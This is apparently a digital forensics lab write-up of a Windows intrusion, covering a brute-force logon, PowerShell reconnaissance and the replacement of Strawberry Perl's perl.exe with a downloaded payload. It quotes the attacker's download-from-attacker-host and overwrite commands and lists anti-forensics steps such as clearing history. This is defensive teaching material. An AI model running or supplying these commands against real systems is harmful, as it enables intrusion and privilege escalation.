```
Before replacement, attacker needs:
├─ Exact file path (C:\Strawberry\perl\bin\perl.exe)
├─ Confirmation it's used by system
├─ DLL load order (for alternative DLL hijacking)
└─ Process usage patterns
```

**Trap Mechanism:**
```
The "Trap":
├─ Replace legitimate perl.exe
├─ Wait for admin to run a Perl script
├─ When admin executes: perl backup.pl
├─ Malicious perl.exe runs instead
├─ Reverse shell connects to attacker
└─ Attacker has admin privileges
```

**Attack Type:** **Execution Hijacking** (MITRE ATT&CK T1574.002)

---

**Forensic Question 2:** Did the attacker move the legitimate application?

**Finding:** **No, the attacker REPLACED it (overwrite)**

**Evidence Location:** PowerShell command history

**Screenshot Reference:** Figure 11 - File copy operation

**Command Evidence:**
```powershell
cp perl.exe C:\Strawberry\perl\bin\perl.exe
```

**Command Analysis:**
- `cp` - Copy-Item alias in PowerShell
- `perl.exe` - Source file (malicious, in current directory)
- `C:\Strawberry\perl\bin\perl.exe` - Destination (overwrites original)

**What Happened:**
```
Before:
C:\Strawberry\perl\bin\perl.exe (LEGITIMATE, 5.2 MB, signed)

Attacker Action:
├─ Downloads malicious binary to Desktop: perl.exe
├─ Copies over legitimate file
└─ cp perl.exe C:\Strawberry\perl\bin\perl.exe

After:
C:\Strawberry\perl\bin\perl.exe (MALICIOUS, size varies, unsigned)
```

**Original Legitimate Binary:**
- ❌ Not backed up by attacker
- ❌ Not moved to alternate location
- ❌ Completely overwritten
- ❌ Lost (unless file recovery used)

**Anti-Forensics Implication:**
- Original file signature lost
- Original file hash lost
- Difficult to prove file replacement (without FIM)
- Plausible deniability (software update gone wrong?)

**Proper Response:**
```
If legitimate file needed:
├─ Restore from backup
├─ Reinstall Strawberry Perl
├─ Download from vendor (https://strawberryperl.com)
└─ Verify hash matches official release
```

---

**Forensic Question 3:** What file did the attacker replace the legitimate application with?

**Finding:** **Malicious per10.exe (renamed to perl.exe)**

**Evidence Location:** PowerShell command history - Invoke-WebRequest

**Screenshot Reference:** Figure 12 - Malicious file download

**Command Evidence:**
```powershell
Invoke-WebRequest http://192.168.56.101:8000/per10.exe -OutFile ./perl.exe
```

**Command Breakdown:**

| Component | Value | Purpose |
|-----------|-------|---------|
| **Command** | Invoke-WebRequest | PowerShell HTTP client |
| **URL** | http://192.168.56.101:8000/per10.exe | Attacker's web server |
| **Port** | 8000 | HTTP server (likely Python SimpleHTTPServer) |
| **Filename** | per10.exe | Malicious payload on attacker's server |
| **Output** | ./perl.exe | Save to current directory as perl.exe |

---

**Attack Infrastructure:**

**Attacker's Command & Control:**
```
IP: 192.168.56.101 (Kali Linux system)
Service: HTTP Server (port 8000)
Implementation: Likely Python SimpleHTTPServer or similar

Setup command (attacker's side):
└─ python3 -m http.server 8000
   └─ Serves files from current directory
      └─ per10.exe available for download
```

**Payload File:**
```
Original Name: per10.exe
Size: Unknown (likely 1-5 MB for reverse shell)
Type: Windows PE executable
Signature: None (unsigned)
Capabilities: Unknown without analysis (likely):
   ├─ Reverse shell (netcat, meterpreter, custom)
   ├─ Credential dumping (mimikatz-like)
   ├─ Keylogger
   ├─ Screenshot capture
   └─ Persistence mechanisms
```

**File Renaming:**
```
Downloaded as: perl.exe (to match legitimate binary)
Reason: 
├─ Blend in with legitimate files
├─ Replace original perl.exe seamlessly
├─ No suspicion when "perl.exe" appears in process list
└─ Execution hijacking requires exact name match
```

---

**Network Forensics:**

**Network Traffic Analysis (if captured):**
```
Connection:
├─ Source: Compromised server (JSmith session)
├─ Destination: 192.168.56.101:8000 (Attacker's web server)
├─ Protocol: HTTP (unencrypted)
├─ Request: GET /per10.exe
├─ Response: 200 OK, binary data

Evidence in:
├─ Firewall logs (outbound connection to 192.168.56.101:8000)
├─ Proxy logs (if proxied)
├─ PCAP files (full HTTP transaction)
├─ DNS logs (if domain used instead of IP)
└─ Web server logs (on attacker's server, if seized)
```

**Indicators of Compromise (IOCs):**
```
Network:
├─ 192.168.56.101 (attacker IP)
├─ TCP/8000 (suspicious web server port)
└─ Outbound HTTP to unusual port

File:
├─ SHA256 hash of per10.exe (if available)
├─ File size and timestamp
├─ Downloaded to user profile (unusual for software)
└─ Unsigned executable

Behavioral:
├─ Invoke-WebRequest from standard user
├─ Download of .exe file
├─ File copy to system directory (C:\Strawberry)
└─ Overwrite of legitimate system file
```

**Defensive Actions:**
```
Block:
├─ Egress traffic to 192.168.56.101
├─ Outbound connections on port 8000
├─ Downloads of .exe files by non-admin users

Detect:
├─ Invoke-WebRequest in PowerShell logs
├─ File modifications in C:\Program Files, C:\Strawberry
├─ Unsigned executables replacing signed ones
├─ File integrity monitoring alerts

Investigate:
├─ Capture per10.exe for malware analysis
├─ Submit to VirusTotal, hybrid-analysis.com
├─ Reverse engineer to understand capabilities
├─ Identify C2 infrastructure
```

---

### Execution Hijacking Technique

**Attack Type:** Execution Hijacking / Binary Replacement  
**MITRE ATT&CK:** T1574.002 - Hijack Execution Flow: DLL Side-Loading

**Similar Techniques:**
- DLL Hijacking
- DLL Preloading
- DLL Search Order Hijacking
- Binary Planting
- Trust Relationship Exploitation

---

**How Execution Hijacking Works:**

**Concept:**
```
Replace a legitimate, trusted executable with a malicious one,
so when a high-privilege user runs the "trusted" program,
they actually execute the attacker's payload with their privileges.
```

**Attack Flow:**
```
1. Attacker (Standard User):
   └─ Identifies trusted executable: perl.exe
   └─ Checks file permissions: Writable!
   └─ Downloads malicious payload: per10.exe
   └─ Renames to match original: perl.exe
   └─ Overwrites legitimate file

2. Victim (Administrator):
   └─ Logs in to server (admin privileges)
   └─ Runs Perl script: perl backup.pl
   └─ System executes: C:\Strawberry\perl\bin\perl.exe
   └─ Malicious binary runs with ADMIN privileges
   └─ Reverse shell connects to attacker
   └─ Attacker now has admin access

3. Result:
   └─ Privilege escalation: Standard → Administrator
   └─ Persistence: Will trigger on every perl.exe execution
   └─ Stealth: Looks like legitimate administrative activity
```

---

**Why This Attack Works:**

**1. Trust Relationship:**
```
Admins trust perl.exe because:
├─ Legitimate software (Strawberry Perl)
├─ Used in normal operations (scripts)
├─ Doesn't trigger security alerts
└─ Expected to be present on server
```

**2. Execution Context:**
```
When admin runs: perl.exe script.pl
├─ Operating system executes C:\Strawberry\perl\bin\perl.exe
├─ Process inherits admin's privileges
├─ Malicious code runs with full admin rights
└─ No UAC prompt (already running as admin)
```

**3. Permission Misconfiguration:**
```
VULNERABILITY:
C:\Strawberry\perl\bin\ is writable by standard users

SHOULD BE:
Only Administrators can modify system executables

EXPLOIT:
Standard user (JSmith) can replace perl.exe
```

---

**Real-World Examples:**

**1. Nation-State APT:**
```
APT Group: APT29 (Cozy Bear, Russia)
Target: Government networks
Technique: Replace legitimate Windows utilities
Example: Replaced whoami.exe with backdoor
Result: Admin runs "whoami" → Backdoor executes
```

**2. Ransomware:**
```
Ransomware: SamSam
Technique: Replace backup utilities
Example: Malicious vssadmin.exe prevents shadow copies
Result: Backups deleted before encryption
```

**3. Banking Trojan:**
```
Malware: Dridex
Technique: Replace browser helper executables
Example: Trojanized Firefox extension loader
Result: Banking credentials stolen
```

---

**Detection Methods:**

**1. File Integrity Monitoring (FIM):**
```
Tools: OSSEC, Tripwire, AIDE
Monitor:
├─ C:\Windows\System32\
├─ C:\Program Files\
├─ C:\Strawberry\perl\bin\
└─ Any system executable directories

Alert on:
├─ File hash change
├─ Timestamp modification
├─ Size change
└─ Signature removal (signed → unsigned)
```

**2. Code Signing Validation:**
```
Windows AppLocker:
├─ Allow only signed executables
├─ Require Microsoft signature for system files
├─ Block unsigned binaries in system directories

Result: Malicious perl.exe (unsigned) → Blocked
```

**3. Behavioral Detection (EDR):**
```
Suspicious Patterns:
├─ Standard user modifying executable in system directory
├─ File copy operation: user directory → system directory
├─ Invoke-WebRequest followed by copy to system path
├─ Unsigned executable replacing signed one
└─ Process execution from unexpected path
```

**4. PowerShell Logging:**
```
Enable:
├─ Script Block Logging (Event ID 4104)
├─ Module Logging
├─ Transcription
└─ Command-line logging (Event ID 4688)

Detect:
├─ Invoke-WebRequest .exe downloads
├─ Copy-Item to system directories
├─ Get-Process, Get-WmiObject (reconnaissance)
└─ Suspicious command sequences
```

---

**Prevention Strategies:**

**1. Least Privilege File Permissions:**
```powershell
# System directories should be admin-only
icacls "C:\Strawberry\perl\bin" /inheritance:r
icacls "C:\Strawberry\perl\bin" /grant Administrators:F
icacls "C:\Strawberry\perl\bin" /grant SYSTEM:F
icacls "C:\Strawberry\perl\bin" /grant "Authenticated Users:RX"
```

**2. Application Whitelisting:**
```
Deploy AppLocker or WDAC:
├─ Whitelist specific versions/hashes
├─ Require digital signatures
├─ Block execution from user directories
└─ Audit mode first, then enforce
```

**3. Endpoint Detection and Response (EDR):**
```
Deploy EDR solution:
├─ Behavioral analysis
├─ Memory protection
├─ Execution prevention
└─ Automated response (quarantine, kill process)
```

**4. Regular Integrity Checks:**
```
Scheduled Task:
├─ Daily: Verify critical file hashes
├─ Weekly: Full system integrity scan
├─ Alert on any modification
└─ Restore from known-good backups
```

---

## 📊 Attack Chain Reconstruction

### Complete Timeline

**Phase 1: Initial Access (Brute Force)**
```
9/7/2021 10:04:47 AM - Attack initiated
├─ Source: 192.168.56.101 (Kali)
├─ Target: Windows Server (various accounts)
├─ Method: Brute force password attack
├─ Tool: Hydra / similar
├─ Evidence: Event ID 4625 (hundreds of failed logons)
└─ Result: JSmith account compromised

Duration: Unknown (minutes to hours)
Success Condition: Weak password guessed/cracked
```

**Phase 2: Reconnaissance (Discovery)**
```
Post-Compromise (timestamp unknown, same day estimated)
├─ Command 1: Get-Process
│   └─ Purpose: Enumerate running processes, identify security tools
├─ Command 2: Get-WmiObject -Class Win32_Product
│   └─ Purpose: Enumerate installed software, find vulnerabilities
├─ Command 3: .\listdlls.exe
│   └─ Purpose: Analyze DLL loading, find hijacking opportunities
└─ Command 4: .\listdlls.exe -r perl
    └─ Purpose: Target perl.exe specifically

Evidence: PowerShell command history
Objective: Situational awareness, identify privilege escalation path
```

**Phase 3: Privilege Escalation Preparation**
```
Post-Reconnaissance (same day estimated)
├─ Step 1: Identify target (perl.exe)
├─ Step 2: Verify writable location (C:\Strawberry\perl\bin\)
├─ Step 3: Download malicious payload
│   └─ Command: Invoke-WebRequest http://192.168.56.101:8000/per10.exe -OutFile ./perl.exe
│   └─ Source: Attacker's web server (Kali Linux)
│   └─ Payload: Malicious executable (reverse shell likely)
└─ Step 4: Replace legitimate perl.exe
    └─ Command: cp perl.exe C:\Strawberry\perl\bin\perl.exe
    └─ Result: Execution hijacking trap set

Evidence: PowerShell command history, network connections
Objective: Set trap for administrator privilege escalation
```

**Phase 4: Privilege Escalation Trigger (Pending)**
```
Waiting for: Administrator to execute Perl script
├─ Scenario: Admin runs: perl.exe backup_script.pl
├─ Execution: Malicious perl.exe runs with admin privileges
├─ Result: Reverse shell connects to 192.168.56.101
├─ Attacker Gains: Full administrator access
└─ Potential Actions: Credential dumping, lateral movement, data exfiltration

Status: Trap set, waiting for trigger
Risk: CRITICAL - Time bomb waiting to detonate
Urgency: Immediate remediation required
```

---

### Attack Visualization

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK KILL CHAIN                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. RECONNAISSANCE                                              │
│     └─ External scanning of target (pre-engagement)             │
│                                                                 │
│  2. WEAPONIZATION                                               │
│     └─ Brute force tool configuration (Hydra + wordlist)        │
│                                                                 │
│  3. DELIVERY                                                    │
│     └─ Network authentication attempts (SMB/RDP)                │
│                                                                 │
│  4. EXPLOITATION                                                │
│     └─ Weak password → Successful authentication                │
│                                                                 │
│  5. INSTALLATION                                                │
│     └─ Malicious perl.exe downloaded and planted                │
│                                                                 │
│  6. COMMAND & CONTROL                                           │
│     └─ Waiting for trigger (admin execution)                    │
│                                                                 │
│  7. ACTIONS ON OBJECTIVES (PENDING)                             │
│     └─ Privilege escalation → Domain compromise                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

### MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description | Evidence |
|--------|-----------|----|----|----------|
| **Initial Access** | Valid Accounts | T1078 | Compromised JSmith via brute force | Event ID 4624 |
| **Initial Access** | Brute Force | T1110.001 | Password guessing attack | Event ID 4625 (multiple) |
| **Execution** | PowerShell | T1059.001 | PowerShell for commands | ConsoleHost_history.txt |
| **Persistence** | Hijack Execution Flow | T1574.002 | Binary replacement (perl.exe) | File modification |
| **Privilege Escalation** | Hijack Execution Flow | T1574.002 | Execution hijacking for admin access | Pending trigger |
| **Defense Evasion** | Masquerading | T1036.005 | Malicious binary as legitimate perl.exe | File replacement |
| **Discovery** | System Information Discovery | T1082 | Get-Process, Get-WmiObject | PowerShell history |
| **Discovery** | Software Discovery | T1518 | Win32_Product enumeration | PowerShell history |
| **Command & Control** | Web Protocols | T1071.001 | HTTP download of payload | Invoke-WebRequest |
| **Command & Control** | Non-Application Layer Protocol | T1095 | Reverse shell (future) | Payload analysis |

---

## 💡 Skills Demonstrated

### Technical Skills

**Windows Security:**
- ✅ Windows Event Log analysis (Security.evtx)
- ✅ Event ID interpretation (4624, 4625, 4672, 4688, etc.)
- ✅ PowerShell command history forensics
- ✅ File system permission analysis
- ✅ Windows authentication mechanisms understanding

**Incident Response:**
- ✅ Forensic evidence collection (log export, preservation)
- ✅ Attack timeline reconstruction
- ✅ Indicator of Compromise (IOC) identification
- ✅ Root cause analysis
- ✅ Containment strategy development
- ✅ Eradication planning
- ✅ Remediation recommendations

**Threat Intelligence:**
- ✅ Attacker technique identification (brute force, execution hijacking)
- ✅ MITRE ATT&CK framework mapping
- ✅ Behavioral analysis
- ✅ Tool identification (Kali, Hydra, Sysinternals)
- ✅ Threat actor profiling

**Log Analysis:**
- ✅ CSV/Excel log correlation
- ✅ Pattern recognition (brute force indicators)
- ✅ Temporal analysis (attack timeline)
- ✅ Cross-log correlation
- ✅ Anomaly detection

**Security Architecture:**
- ✅ Access control weakness identification
- ✅ Defense-in-depth gap analysis
- ✅ Security control recommendations
- ✅ Hardening strategies
- ✅ Monitoring and detection design

### Professional Competencies

**Investigation:**
- ✅ Systematic investigation methodology
- ✅ Evidence-based conclusions
- ✅ Hypothesis testing
- ✅ Forensic rigor
- ✅ Documentation practices

**Communication:**
- ✅ Executive summary writing
- ✅ Technical detail documentation
- ✅ Stakeholder reporting
- ✅ Incident narrative development
- ✅ Remediation guidance

**Critical Thinking:**
- ✅ Attack chain reconstruction
- ✅ Attacker motivation analysis
- ✅ Risk assessment
- ✅ Prioritization of remediation actions
- ✅ Lessons learned extraction

---

## 🌐 Real-World Applications

### Security Operations Center (SOC)

**Scenario:** Brute Force Alert Triage

**Tier 1 Analyst:**
```
Alert: Multiple failed logons detected
├─ Review Event ID 4625 entries
├─ Identify source IP and account targets
├─ Determine if successful logon occurred (4624)
├─ Escalate to Tier 2 if breach confirmed
```

**Tier 2 Analyst (Lab Skills Applied):**
```
Investigation:
├─ Export security logs for analysis
├─ Import to Excel/SIEM for correlation
├─ Identify compromised account (JSmith)
├─ Check for post-compromise activity
├─ Analyze PowerShell history
├─ Identify privilege escalation attempts
└─ Escalate to Incident Response
```

**Tier 3 / Incident Response:**
```
Response:
├─ Containment (disable account, block IP)
├─ Eradication (remove malicious files)
├─ Recovery (restore legitimate files)
├─ Lessons learned (implement controls)
```

---

### Digital Forensics Investigation

**Scenario:** Post-Breach Forensics

**Investigation Steps (Lab Mirrors Real-World):**

**1. Evidence Collection:**
```
Collect:
├─ Windows Event Logs (Security, System, Application)
├─ PowerShell logs (Script Block, Module, Transcription)
├─ File system artifacts (MFT, $UsnJrnl, $LogFile)
├─ Memory dump (if system still running)
├─ Network logs (firewall, proxy, NetFlow)
└─ Endpoint logs (EDR, antivirus)
```

**2. Timeline Analysis:**
```
Reconstruct:
├─ Initial access timestamp
├─ Reconnaissance activities
├─ Lateral movement attempts
├─ Privilege escalation
├─ Data exfiltration (if any)
└─ Persistence mechanisms
```

**3. Reporting:**
```
Deliverable:
├─ Executive summary
├─ Technical timeline
├─ IOCs for threat intelligence
├─ Remediation recommendations
└─ Legal/compliance notifications
```

---

### Penetration Testing

**Scenario:** Post-Exploitation Simulation

**Red Team Exercise (Ethical Hacking):**

**Phase 1: Gain Initial Access**
```
Lab Technique: Brute force attack
Real-World: 
├─ Phishing (more common)
├─ Password spraying
├─ Exploit public-facing application
└─ Physical access (USB drop)
```

**Phase 2: Post-Exploitation**
```
Lab Technique: PowerShell reconnaissance
Commands Used:
├─ Get-Process (security product enumeration)
├─ Get-WmiObject (software inventory)
├─ Network enumeration (Get-NetAdapter, Get-NetRoute)
└─ User enumeration (Get-LocalUser, Get-ADUser)
```

**Phase 3: Privilege Escalation**
```
Lab Technique: Execution hijacking (perl.exe)
Alternatives:
├─ Kernel exploits (EternalBlue, PrintSpoofer)
├─ Token impersonation (SeImpersonatePrivilege)
├─ Scheduled task abuse
├─ Service misconfiguration
└─ DLL hijacking (similar to lab)
```

**Phase 4: Reporting**
```
Pentest Report:
├─ Findings (weak password, no account lockout)
├─ Risk Rating (Critical - privilege escalation)
├─ Proof of Concept (screenshots, commands)
├─ Remediation (same as lab recommendations)
└─ Retest results (verify fix)
```

---

### Compliance & Audit

**Scenario:** Security Control Assessment

**Audit Findings (Based on Lab Incident):**

**NIST 800-53 Compliance:**
```
Control: AC-7 (Unsuccessful Logon Attempts)
Status: ❌ NON-COMPLIANT
Finding: No account lockout configured
Evidence: Hundreds of failed logons without lockout
Remediation: Implement 5-attempt threshold, 30-min lockout
```

```
Control: AC-2 (Account Management)
Status: ❌ NON-COMPLIANT
Finding: Weak password policy
Evidence: JSmith account compromised via brute force
Remediation: 14-character minimum, complexity required
```

```
Control: AU-2 (Audit Events)
Status: ✅ PARTIALLY COMPLIANT
Finding: Logging enabled but not monitored
Evidence: Attack undetected until forensic analysis
Remediation: Deploy SIEM with real-time alerting
```

```
Control: CM-7 (Least Functionality)
Status: ❌ NON-COMPLIANT
Finding: Excessive file permissions
Evidence: Standard user can modify system binaries
Remediation: Restrict C:\Strawberry to admin-only
```

**PCI-DSS Compliance:**
```
Requirement 8.2.3: Strong passwords
Status: ❌ FAILED
Remediation: Enforce 8.2.3 requirements

Requirement 8.2.5: Account lockout
Status: ❌ FAILED
Remediation: 6 attempts max, 30-min lockout

Requirement 10.2: Audit trail
Status: ⚠️ PARTIAL
Remediation: Enable detailed audit logging
```

---

### Managed Security Service Provider (MSSP)

**Scenario:** 24/7 Security Monitoring

**Client Alert Workflow:**

**Alert Received:**
```
SIEM Alert: Multiple Failed Logons
Client: ABC Corporation
Source: 192.168.56.101
Target: DC01 (Domain Controller)
Time: 10:04 AM
```

**MSSP Response (Lab Investigation Applied):**
```
Tier 1:
├─ Verify alert validity
├─ Check for successful logon
├─ Contact client
└─ Escalate if breach confirmed

Tier 2:
├─ Export security logs (Lab Step 1)
├─ Analyze in Excel/SIEM (Lab Step 2)
├─ Identify compromised account (Lab Finding)
├─ Check for lateral movement
└─ Recommend containment

Tier 3:
├─ Remote incident response
├─ Forensic analysis (PowerShell history)
├─ Malware analysis (perl.exe payload)
├─ Full remediation
└─ Post-incident report
```

**Client Deliverable:**
```
MSSP Monthly Report:
├─ Incident summary (brute force → privilege escalation)
├─ Response timeline (detection to remediation)
├─ Remediation status
├─ Recommendations (same as lab)
└─ Compliance impact assessment
```

---

### Career Paths Enabled

| Role | Lab Skills Applied | Typical Salary (USD) |
|------|-------------------|---------------------|
| **SOC Analyst (Tier 2/3)** | Log analysis, incident triage, threat hunting | $70k - $100k |
| **Incident Responder** | Forensics, timeline reconstruction, remediation | $85k - $130k |
| **Digital Forensics Analyst** | Evidence collection, log correlation | $80k - $120k |
| **Threat Hunter** | Behavioral analysis, attack technique identification | $90k - $135k |
| **Penetration Tester** | Post-exploitation, privilege escalation | $90k - $140k |
| **Security Architect** | Defense design, control recommendations | $120k - $180k |
| **MSSP Analyst** | Multi-client monitoring, incident response | $65k - $105k |

---

## 📚 Key Learnings

### 1. Windows Event Logs Are Gold Mines

**What We Learned:**
```
Windows Security Event Log contained:
✓ Exact attack start time (10:04:47 AM)
✓ Attacker hostname (Kali)
✓ Attacker IP (192.168.56.101)
✓ Compromised account (JSmith)
✓ Complete attack pattern (brute force)
```

**Critical Event IDs to Know:**

| Event ID | Name | Significance | When to Alert |
|----------|------|--------------|---------------|
| 4624 | Successful Logon | Account accessed | After multiple 4625s |
| 4625 | Failed Logon | Brute force indicator | 10+ in 5 minutes |
| 4648 | Explicit Credentials | RunAs, lateral movement | From non-admin user |
| 4672 | Special Privileges | Admin access granted | Unexpected escalation |
| 4688 | Process Created | Command execution | Suspicious processes |
| 4698 | Scheduled Task Created | Persistence | Any non-admin creation |
| 4720 | Account Created | User added | Any creation |
| 4732 | Group Membership | User added to admin | Privilege escalation |

**Best Practice:**
- Forward all logs to SIEM
- Retain for 90+ days (compliance)
- Monitor in real-time (don't wait for incident)
- Index for rapid searching

---

### 2. PowerShell History Never Lies

**Discovery:**
```
PowerShell History Location:
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Contains:
├─ Every command typed (even deleted ones)
├─ Reconnaissance commands
├─ Privilege escalation attempts
├─ File download commands
└─ Complete attack narrative
```

**Why This Matters:**
- Attackers often don't clear history
- Commands persist across sessions
- Plain text (no encryption)
- Perfect forensic evidence

**Attacker OPSEC Failure:**
```
Should have done:
├─ Clear-History (clears session history)
├─ Remove-Item $env:APPDATA\...\ConsoleHost_history.txt
├─ Use in-memory scripts (no file writes)
└─ Invoke-Expression (download and execute without saving)
```

**Defender Action:**
```
Enable PowerShell Logging:
├─ Script Block Logging (Event ID 4104)
├─ Module Logging
├─ Transcription (logs all output)
└─ Command-line logging (Event ID 4688)
```

**Forensic Value:** Complete attack reconstruction from history file alone

---

### 3. Account Lockout Is Basic But Critical

**Lab Finding:**
```
No account lockout policy → Unlimited brute force attempts
Result: Attacker tries thousands of passwords until success
```

**Industry Standard:**
```
Account Lockout Policy:
├─ Threshold: 5 failed attempts
├─ Duration: 30 minutes
├─ Reset Counter: 30 minutes
└─ Admin accounts: Same or stricter
```

**Real-World Impact:**

**Without Lockout:**
```
Attacker tries:
├─ 1000 passwords per minute (automated)
├─ 60,000 passwords per hour
├─ 1.4 million passwords per day
├─ Hits common password within hours
```

**With Lockout:**
```
Attacker tries:
├─ 5 passwords
├─ Account locked for 30 minutes
├─ 10 passwords per hour (if persistent)
├─ 240 passwords per day max
├─ Years to crack even medium-strength password
```

**Tradeoff:**
- Pro: Stops brute force
- Con: DoS risk (attacker locks legitimate users)
- Solution: Monitoring + MFA

---

### 4. Multi-Factor Authentication Stops This Cold

**Lab Attack Would Have Failed If:**
```
MFA Enabled on JSmith account
├─ Attacker has password (from brute force)
├─ Attacker needs second factor:
│   ├─ SMS code (sent to JSmith's phone)
│   ├─ Authenticator app code (time-based)
│   ├─ Biometric (fingerprint, facial recognition)
│   └─ Hardware token (YubiKey, RSA)
├─ Attacker doesn't have second factor
└─ Authentication fails despite correct password
```

**MFA Effectiveness:**
- Stops 99.9% of automated attacks (Microsoft data)
- Even weak passwords become resistant to brute force
- Phishing-resistant MFA (FIDO2) even better

**Implementation Priority:**
```
Deploy MFA for:
1. All administrator accounts (CRITICAL)
2. Remote access (VPN, RDP, SSH)
3. Cloud services (Office 365, AWS, etc.)
4. Privileged applications
5. All users (eventually)
```

---

### 5. Least Privilege Prevents Lateral Damage

**Lab Vulnerability:**
```
File Permissions Misconfiguration:
C:\Strawberry\perl\bin\
└─ Writable by "Authenticated Users" (ALL USERS)
   └─ Should be: Administrators only
```

**Why This Matters:**
```
Correct Permissions:
├─ JSmith (standard user) → Cannot modify perl.exe
├─ Attacker cannot set privilege escalation trap
├─ Even with account compromise, limited damage
└─ Defense-in-depth layer

Actual Permissions:
├─ JSmith → Can modify perl.exe
├─ Attacker replaces binary
├─ Admin executes trojanized perl.exe
└─ Full system compromise
```

**Principle of Least Privilege:**
```
Users should have:
├─ Minimum permissions needed for job function
├─ No more, no less
├─ Time-limited elevated access (when needed)
└─ Regular access reviews
```

**Real-World Application:**
```
File System:
├─ C:\Windows\System32\ → Admin only
├─ C:\Program Files\ → Admin only (write), Users (read/execute)
├─ C:\Users\Username\ → User (full control), Admin (full control)
└─ Sensitive directories → Restrict access

Active Directory:
├─ Domain Admin → Only for domain controllers
├─ Server Admin → Only for specific servers
├─ Standard User → 95% of workforce
└─ Temporary elevation → PAM solutions
```

---

### 6. Execution Hijacking Is More Common Than You Think

**Attack Variants:**

**1. DLL Hijacking (Most Common):**
```
Application searches for DLL in this order:
1. Application directory
2. System32
3. Current directory
4. PATH environment variable

Exploit:
├─ Place malicious DLL in higher priority location
├─ Application loads malicious DLL instead
├─ Code executes with application's privileges
```

**2. Binary Replacement (This Lab):**
```
├─ Replace legitimate .exe with malicious one
├─ User/admin executes "trusted" binary
├─ Malicious code runs with their privileges
```

**3. Path Interception:**
```
Modify PATH environment variable:
├─ Add attacker-controlled directory first
├─ Place malicious python.exe, java.exe, etc.
├─ User runs: python script.py
├─ System finds attacker's python.exe first
└─ Malicious version executes
```

**4. Service Binary Hijacking:**
```
Windows Service Configuration:
├─ Checks: C:\Program Files\App\service.exe
├─ If writable: Replace with malicious binary
├─ Service restarts: Malicious code as SYSTEM
```

**Real-World Incidents:**
```
APT Groups:
├─ APT29: whoami.exe replacement
├─ APT28: MS Office DLL hijacking
├─ Lazarus Group: Chrome update hijacking

Ransomware:
├─ Ryuk: Service binary replacement
├─ Conti: Explorer.exe DLL hijacking
```

**Detection:**
```
File Integrity Monitoring:
├─ Baseline all system executables
├─ Alert on any modification
├─ Verify digital signatures
└─ Compare hashes to vendor-published values

Endpoint Detection:
├─ Unsigned binary in system directory
├─ Process execution from unexpected path
├─ DLL loaded from user directory
└─ Behavioral anomalies
```

---

### 7. Monitoring Without Response Is Useless

**Lab Reality:**
```
Logging Enabled: ✓
├─ Security events recorded
├─ PowerShell history saved
├─ File access logged

Monitoring: ✗
├─ No real-time review
├─ No automated alerts
├─ No SIEM correlation
└─ Attack discovered AFTER the fact
```

**Effective Monitoring:**
```
Logging → Collection → Correlation → Alerting → Response

Example:
├─ Event 4625 × 100 → SIEM detects pattern
├─ SIEM triggers alert: "Brute force in progress"
├─ SOC analyst notified within 2 minutes
├─ Analyst blocks IP, disables account
├─ Attack stopped before success
```

**Detection Use Cases (Should Have Alerted):**

**1. Brute Force Detection:**
```
Rule:
IF Event 4625 > 10 in 5 minutes
FROM same source IP
THEN alert("Brute force attack")
AND block(source_ip)
AND notify(SOC)
```

**2. Account Compromise Detection:**
```
Rule:
IF Event 4624 (success)
AFTER Event 4625 × many (failures)
FROM same source IP
WITHIN 24 hours
THEN alert("Account compromised")
AND force_password_reset(account)
```

**3. Privilege Escalation Detection:**
```
Rule:
IF PowerShell command contains "Invoke-WebRequest"
AND destination = external IP
AND user = standard user
THEN alert("Potential malware download")
AND kill_process(powershell.exe)
```

**4. File Modification Alert:**
```
Rule:
IF file modified in C:\Program Files OR C:\Windows
BY standard user
THEN alert("Unauthorized system file modification")
AND revert_from_backup
```

**SIEM Is Essential:**
- Splunk, QRadar, Microsoft Sentinel, ELK Stack
- Correlates logs from multiple sources
- Detects patterns humans can't see
- Automates response (SOAR integration)

---

### 8. Defense-in-Depth Would Have Limited Impact

**Single Layer Failures:**
```
Password Policy → Failed (weak password)
Account Lockout → Failed (not configured)
MFA → Failed (not enabled)
File Permissions → Failed (writable by all users)
Application Whitelisting → Failed (not configured)
File Integrity Monitoring → Failed (not deployed)
EDR → Failed (not present)
SIEM Alerting → Failed (not monitoring)
```

**Result:** Complete compromise

**Defense-in-Depth Applied:**
```
Layer 1: Strong Password + MFA
├─ Stops brute force attack
└─ Attack ends here ✓

Layer 2: Account Lockout
├─ If Layer 1 bypassed (stolen password)
├─ Limits brute force effectiveness
└─ Backup protection

Layer 3: File Permissions
├─ If account compromised
├─ Prevents binary replacement
└─ Limits privilege escalation

Layer 4: Application Whitelisting
├─ If binary replaced
├─ Blocks unsigned executable
└─ Prevents malicious execution

Layer 5: EDR
├─ If all else fails
├─ Detects behavioral anomalies
├─ Kills malicious process
└─ Alerts security team

Layer 6: Network Segmentation
├─ If system compromised
├─ Limits lateral movement
└─ Contains damage
```

**Best Practice:** No single control = single point of failure

---